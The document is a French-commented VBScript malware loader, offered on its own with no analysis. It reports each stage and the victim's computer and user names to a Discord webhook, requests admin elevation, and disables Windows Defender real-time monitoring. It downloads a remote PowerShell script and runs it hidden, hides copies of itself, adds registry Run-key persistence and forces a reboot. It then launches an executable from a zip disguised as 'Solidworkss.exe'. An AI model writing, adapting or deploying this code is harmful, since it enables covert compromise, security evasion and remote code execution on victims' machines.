On Error Resume Next
Randomize

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objShellApp = CreateObject("Shell.Application")
Set WMI = GetObject("winmgmts:\\.\root\cimv2")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set stream = CreateObject("ADODB.Stream")

' === WEBHOOK ===
webhookURL = "https://discord.com/api/webhooks/TON_WEBHOOK_ICI"
enableDiscord = (InStr(LCase(webhookURL), "discord.com/api/webhooks/") > 0 And webhookURL <> "")

Function SendToDiscord(title, description, color)
    If Not enableDiscord Then Exit Function
    On Error Resume Next
    payload = "{""embeds"":[{""title"":""" & Replace(title, """", "\""") & """,""description"":""" & Replace(description, """", "\""") & """,""color"":" & color & ",""timestamp"":""" & IsoUtcNow() & """}]}"
    http.Open "POST", webhookURL, False
    http.SetTimeouts 5000, 5000, 10000, 10000
    http.SetRequestHeader "Content-Type", "application/json"
    http.Send payload
    If Err.Number <> 0 Or http.Status < 200 Or http.Status >= 300 Then enableDiscord = False
    Err.Clear
    On Error Goto 0
End Function

Function IsoUtcNow()
    IsoUtcNow = FormatDateTime(DateAdd("h", WshShell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation\ActiveTimeBias") / -60, Now()), 2) & "T" & _
                Right("0" & Hour(Now()),2) & ":" & Right("0" & Minute(Now()),2) & ":" & Right("0" & Second(Now()),2) & "Z"
End Function

computerName = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
userName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
prefix = "**[" & computerName & " | " & userName & "]**"

vbsPath = WScript.ScriptFullName
vbsDir = fso.GetParentFolderName(vbsPath)

tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
appDataDir = WshShell.ExpandEnvironmentStrings("%APPDATA%")
trueStartup = appDataDir & "\Microsoft\Windows\Start Menu\Programs\Startup"
hiddenDir = appDataDir & "\Microsoft\WindowsCore"
globalMarker = appDataDir & "\.initlock"
mutexFile = appDataDir & "\.running"
regMutex = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VbsMutex"

If Not fso.FolderExists(hiddenDir) Then fso.CreateFolder hiddenDir

' Mutex robuste fichier + registre
If fso.FileExists(mutexFile) Or WshShell.RegRead(regMutex) = "1" Then 
    SendToDiscord "Duplication", prefix & " Instance active.", 16711680
    WScript.Quit
End If
fso.CreateTextFile mutexFile, True
WshShell.Run "attrib +h +s +r """ & mutexFile & """ >nul 2>&1", 0, False
WshShell.RegWrite regMutex, "1", "REG_SZ"

SendToDiscord "Démarré", prefix & " Exécution.", 65280

zipName = "test1.zip"
zipLocations = Array(tempDir & "\" & zipName, appDataDir & "\" & zipName, hiddenDir & "\" & zipName, trueStartup & "\" & zipName)

If fso.FileExists(vbsDir & "\" & zipName) Then
    For Each loc In zipLocations
        On Error Resume Next
        fso.CopyFile vbsDir & "\" & zipName, loc, True
        If fso.FileExists(loc) Then WshShell.Run "attrib +h +s +r """ & loc & """ >nul 2>&1", 0, False
        On Error Goto 0
    Next
    SendToDiscord "ZIP propagé", prefix & " OK.", 3447003
End If

Function IsElevated()
    On Error Resume Next
    WshShell.RegWrite "HKLM\SOFTWARE\TestElev", 1, "REG_DWORD"
    If Err.Number = 0 Then WshShell.RegDelete "HKLM\SOFTWARE\TestElev"
    IsElevated = (Err.Number = 0)
    Err.Clear
End Function

If Not IsElevated() Then
    SendToDiscord "UAC", prefix & " Demande.", 16776960
    objShellApp.ShellExecute "wscript.exe", """" & vbsPath & """", "", "runas", 1
    GoTo Cleanup
End If

SendToDiscord "Admin OK", prefix & " Privilèges.", 65280

exeName = "Solidworkss.exe"
exeTemp = tempDir & "\" & exeName
exePersist = trueStartup & "\" & exeName

' Defender realtime
On Error Resume Next
Set psExec = WshShell.Exec("powershell.exe -Command ""try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; exit 0 } catch { exit 1 }""")
timeout = 0
Do While psExec.Status = 0 And timeout < 50
    WScript.Sleep 100
    timeout = timeout + 1
Loop
If psExec.ExitCode = 0 Then SendToDiscord "Defender off", prefix & " OK.", 65280
On Error Goto 0

' Disable.ps1 en RAM (UTF-16LE correct)
rawPsUrl = "https://raw.githubusercontent.com/xxxxxxxx/xxxxxxxx/main/Disable.ps1"

On Error Resume Next
http.Open "GET", rawPsUrl, False
http.SetTimeouts 5000, 5000, 10000, 10000
http.Send
If http.Status = 200 And http.responseBody <> "" Then
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "UTF-16LE"
    psCode = stream.ReadText
    stream.Close
    If Len(psCode) > 200 Then
        encoded = Base64EncodeUTF16(psCode)
        WshShell.Run "powershell.exe -EncodedCommand " & encoded, 0, False
        SendToDiscord "Disable.ps1 OK", prefix & " Lancé.", 65280
    End If
End If
On Error Goto 0

Function Base64EncodeUTF16(text)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 2
    BinaryStream.Charset = "UTF-16LE"
    BinaryStream.Open
    BinaryStream.WriteText text
    BinaryStream.Position = 0
    BinaryStream.Type = 1
    Set node = CreateObject("MSXML2.DOMDocument.6.0").CreateElement("tmp")
    node.DataType = "bin.base64"
    node.NodeTypedValue = BinaryStream.Read
    Base64EncodeUTF16 = node.Text
    BinaryStream.Close
End Function

' Reboot unique
If Not fso.FileExists(globalMarker) And fso.FileExists(vbsDir & "\" & zipName) Then
    On Error Resume Next
    fso.CreateTextFile globalMarker, True
    WshShell.Run "attrib +h +s +r """ & globalMarker & """ >nul 2>&1", 0, False
    WshShell.Run "shutdown /r /f /t 900 >nul 2>&1", 0, False
    SendToDiscord "Reboot", prefix & " 15 min.", 16776960
    On Error Goto 0
    GoTo Cleanup
End If

' Duplication VBS
vbsCopies = Array(tempDir & "\startup.vbs", appDataDir & "\core.vbs", trueStartup & "\persist.vbs", hiddenDir & "\backup.vbs")
copiesMade = 0
For i = 0 To 3
    target = vbsCopies(i)
    If Not fso.FileExists(target) Then
        On Error Resume Next
        fso.CopyFile vbsPath, target, True
        If fso.FileExists(target) Then 
            WshShell.Run "attrib +h +s +r """ & target & """ >nul 2>&1", 0, False
            copiesMade = copiesMade + 1
        End If
        On Error Goto 0
    End If
Next
SendToDiscord "VBS copies", prefix & copiesMade & "/4.", 3447003

' Persistance VBS
validVbs = ""
For Each cp In vbsCopies
    If fso.FileExists(cp) Then validVbs = cp : Exit For
Next
If validVbs <> "" Then
    On Error Resume Next
    current = ""
    Err.Clear
    current = WshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist")
    If current <> "wscript.exe //B """ & validVbs & """" Then
        WshShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist"
        WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VbsPersist", "wscript.exe //B """ & validVbs & """", "REG_SZ"
        SendToDiscord "VBS persist", prefix & " OK.", 65280
    End If
    On Error Goto 0
End If

' Boucle payload
counter = 0
Do While counter < 80
    counter = counter + 1

    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & exeName & "'")
    If procs.Count > 0 Then 
        SendToDiscord "Payload running", prefix & " Actif.", 65280
        GoTo Cleanup
    End If

    sourceZip = ""
    For Each loc In zipLocations
        If fso.FileExists(loc) Then sourceZip = loc : Exit For
    Next

    If sourceZip <> "" Then
        On Error Resume Next
        Set extractExec = WshShell.Exec("powershell.exe -Command ""try { Expand-Archive -LiteralPath '" & sourceZip & "' -DestinationPath '" & tempDir & "' -Force; exit 0 } catch { exit 1 }""")
        timeout = 0
        Do While extractExec.Status = 0 And timeout < 100
            WScript.Sleep 200
            timeout = timeout + 1
        Loop
        extractOK = (extractExec.ExitCode = 0)
        If Not extractOK Then
            ' Fallback manual unzip
            CreateObject("Shell.Application").NameSpace(tempDir).CopyHere CreateObject("Shell.Application").NameSpace(sourceZip).Items
            extractOK = fso.FileExists(exeTemp)
        End If
        On Error Goto 0

        If extractOK And fso.FileExists(exeTemp) Then
            Set binStream = CreateObject("ADODB.Stream")
            binStream.Type = 1
            binStream.Open
            binStream.LoadFromFile exeTemp
            binStream.Position = 0
            header = binStream.Read(2)
            binStream.Close
            If fso.GetFile(exeTemp).Size > 50000 And header = "MZ" Then
                SendToDiscord "Extraction OK", prefix & " PE valide.", 3447003
                fso.CopyFile exeTemp, exePersist, True
                If fso.FileExists(exePersist) Then WshShell.Run "attrib +h +s +r """ & exePersist & """ >nul 2>&1", 0, False

                On Error Resume Next
                WshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ExePersist", """" & exeTemp & """", "REG_SZ"
                SendToDiscord "EXE persist", prefix & " OK.", 65280
                On Error Goto 0

                WshShell.Run """" & exeTemp & """", 0, False
                SendToDiscord "Payload lancé", prefix & " Démarré.", 65280
                GoTo Cleanup
            End If
        End If
    End If

    WScript.Sleep 10000 + Int(Rnd * 20000)
Loop

SendToDiscord "Fin", prefix & " Terminé.", 8421504

Cleanup:
On Error Resume Next
fso.DeleteFile mutexFile
WshShell.RegDelete regMutex
SendToDiscord "Clean", prefix & " Mutex nettoyé.", 8421504
On Error Goto 0
